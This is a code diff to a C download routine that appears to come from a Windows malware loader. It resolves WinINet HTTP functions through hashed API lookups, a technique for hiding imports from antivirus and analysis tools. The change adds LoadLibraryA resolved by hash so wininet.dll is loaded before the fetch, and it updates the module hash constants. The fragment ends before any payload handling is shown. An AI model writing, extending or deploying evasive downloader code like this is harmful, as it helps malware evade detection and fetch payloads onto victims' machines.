@@ -4,31 +4,37 @@
 
 #include "include/common.h"
 
-#define InternetOpenA_JOAA			0x154BE30F
-#define InternetConnectA_JOAA		0x51CC39CF
-#define HttpOpenRequestA_JOAA		0x03084192
-#define InternetSetOptionA_JOAA		0xD8C64F22
-#define HttpSendRequestA_JOAA		0xA14CFDA5
-#define InternetReadFile_JOAA		0xF1FF9642
-#define InternetCloseHandle_JOAA	0x9E679473
-#define GetTickCount64_JOAA			0x00BB616E
-#define KERNEL32DLL_JOAA			0xE2E3C536
-#define WININETDLL_JOAA				0xE692FFDE
+#define InternetOpenA_JOAA      0x154BE30F
+#define InternetConnectA_JOAA   0x51CC39CF
+#define HttpOpenRequestA_JOAA   0x03084192
+#define InternetSetOptionA_JOAA         0xD8C64F22
+#define HttpSendRequestA_JOAA   0xA14CFDA5
+#define InternetReadFile_JOAA   0xF1FF9642
+#define InternetCloseHandle_JOAA        0x9E679473
+#define GetTickCount64_JOAA     0x00BB616E
+#define LoadLibraryA_JOAA	0x54C1D227
+#define KERNEL32DLL_JOAA        0xFD2AD9BD
+#define WININETDLL_JOAA         0x668CA1EC
 
 
 API_HASHING g_Api = { 0 };
 
 DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl)
 {
-	printf("%p", (void*)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetTickCount64"));
-	g_Api.pInternetOpenA = (fnInternetOpenA)GetProcAddressH(GetModuleHandleH(WININETDLL_JOAA), InternetOpenA_JOAA);
-	g_Api.pInternetConnectA = (fnInternetConnectA)GetProcAddressH(GetModuleHandleH(WININETDLL_JOAA), InternetConnectA_JOAA);
-	g_Api.pHttpOpenRequestA = (fnHttpOpenRequestA)GetProcAddressH(GetModuleHandleH(WININETDLL_JOAA), HttpOpenRequestA_JOAA);
-	g_Api.pInternetSetOptionA = (fnInternetSetOptionA)GetProcAddressH(GetModuleHandleH(WININETDLL_JOAA), InternetSetOptionA_JOAA);
-	g_Api.pHttpSendRequestA = (fnHttpSendRequestA)GetProcAddressH(GetModuleHandleH(WININETDLL_JOAA), HttpSendRequestA_JOAA);
-	g_Api.pInternetReadFile = (fnInternetReadFile)GetProcAddressH(GetModuleHandleH(WININETDLL_JOAA), InternetReadFile_JOAA);
-	g_Api.pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressH(GetModuleHandleH(WININETDLL_JOAA), InternetCloseHandle_JOAA);
+	HANDLE kernerl32_handle = GetModuleHandleH(KERNEL32DLL_JOAA);
+	g_Api.pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernerl32_handle, LoadLibraryA_JOAA);
+
+	HANDLE wininet_handle = g_Api.pLoadLibraryA("wininet.dll");
+	
+	g_Api.pInternetOpenA = (fnInternetOpenA)GetProcAddressH(wininet_handle, InternetOpenA_JOAA);
+	g_Api.pInternetConnectA = (fnInternetConnectA)GetProcAddressH(wininet_handle, InternetConnectA_JOAA);
+	g_Api.pHttpOpenRequestA = (fnHttpOpenRequestA)GetProcAddressH(wininet_handle, HttpOpenRequestA_JOAA);
+	g_Api.pInternetSetOptionA = (fnInternetSetOptionA)GetProcAddressH(wininet_handle, InternetSetOptionA_JOAA);
+	g_Api.pHttpSendRequestA = (fnHttpSendRequestA)GetProcAddressH(wininet_handle, HttpSendRequestA_JOAA);
+	g_Api.pInternetReadFile = (fnInternetReadFile)GetProcAddressH(wininet_handle, InternetReadFile_JOAA);
+	g_Api.pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressH(wininet_handle, InternetCloseHandle_JOAA);
 	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
+
 
 	if (g_Api.pGetTickCount64 == NULL) printf("GetTickCount64\n");
 	if (g_Api.pInternetOpenA == NULL) printf("InternetOpenA\n");
